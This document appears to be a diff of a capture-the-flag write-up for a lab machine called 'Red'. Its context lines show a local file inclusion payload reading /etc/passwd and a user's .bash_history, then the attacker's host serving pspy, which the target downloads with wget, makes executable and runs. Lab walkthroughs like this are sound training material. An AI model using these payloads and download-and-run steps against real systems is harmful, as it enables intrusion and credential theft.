@@ -389,7 +389,6 @@ ________________________________________________
 
 :: Progress: [922/922] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
 
-
 http://10.10.70.179/index.php?page=php://filter/resource=/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin blue:x:1000:1000:blue:/home/blue:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false red:x:1001:1001::/home/red:/bin/bash 
@@ -399,7 +398,6 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 http://10.10.124.199/index.php?page=file:////home/blue/.bash_history
 
 echo "Red rules" cd hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt cat passlist.txt rm passlist.txt sudo apt-get remove hashcat -y 
-
 
 https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html
 
@@ -465,7 +463,6 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
 6 of these updates are standard security updates.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
@@ -503,7 +500,6 @@ Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
 10.10.70.179 - - [15/Jul/2023 17:51:19] "GET /pspy64s HTTP/1.1" 200 -
 10.10.70.179 - - [15/Jul/2023 17:51:42] "GET /pspy64 HTTP/1.1" 200 -
 
-
 blue@red:/tmp$ wget http://10.8.19.103:1234/pspy64
 --2023-07-15 21:51:43--  http://10.8.19.103:1234/pspy64
 Connecting to 10.8.19.103:1234... connected.
@@ -518,7 +514,6 @@ pspy64                     100%[======================================>]   2.96M
 blue@red:/tmp$ chmod +x pspy64 
 blue@red:/tmp$ ./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
-
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
@@ -1008,11 +1003,7 @@ ff00::0 ip6-mcastprefix
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouter
 
-
-
 ```
-
-![[Pasted image 20230714212029.png]]
 
 What is the first flag?
 
